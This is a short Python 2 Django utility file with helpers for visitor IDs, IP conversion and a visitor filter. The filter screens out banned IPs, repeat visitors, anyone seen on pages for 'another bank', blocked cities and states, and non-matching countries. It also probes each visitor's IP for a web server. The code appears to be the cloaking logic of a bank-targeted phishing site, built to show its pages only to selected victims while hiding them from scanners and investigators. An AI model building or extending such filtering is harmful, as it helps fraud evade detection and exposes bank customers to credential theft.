import string
import random
import datetime
import urllib2

from website.models import Visitor, IPBan
from website import settings as app_settings


def generate_subid():
    """Generate new `subid`, which doesn't exists in database"""

    sequence = list(string.ascii_letters + string.digits)

    while True:
        random.shuffle(sequence)
        subid = ''.join(sequence[:15])

        if not Visitor.objects.filter(text=subid).exists():
            return subid


def legitimate_visitor(ip, geo_data, v):
    if ip and IPBan.objects.filter(ip=iptoint(ip)).exists():
        return 'ip'

    dt3 = datetime.datetime.now() - datetime.timedelta(days=3)
    dt5 = datetime.datetime.now() - datetime.timedelta(days=5)
    number_of_visits = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt3).count() >= 3
    another_bank = Visitor.objects.filter(ip=ip, visit_datetime__gte=dt5).exclude(keyword=v.keyword_id).exists()

    if number_of_visits:
        return 'visted already'
    if another_bank:
        return 'another bank'
    if geo_data.get('city', '').lower() in app_settings.CITIES:
        return 'city'
    if geo_data.get('region_name', '').lower() in app_settings.STATES:
        return 'region_name'
    if not geo_data.get('country_code', '').lower() in app_settings.ALLOWED_COUNTRY:
        return 'country_code'
    if geo_data.get('country_code', '').upper() != v.keyword.country:
        return 'wrong bank country_code'

    return ''


def is_server(ip):
    """Check if IP has its own web-server"""

    try:
        urllib2.urlopen('http://%s' % ip, timeout=0.5)
    except urllib2.URLError:
        return False
    return True


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def iptoint(ip):
    hexn = ''.join(["%02X" % long(i) for i in ip.split('.')])

    return long(hexn, 16)


def inttoip(n):
    d = 256 * 256 * 256
    q = []
    while d > 0:
        m, n = divmod(n,d)
        q.append(str(m))
        d /= 256

    return '.'.join(q)
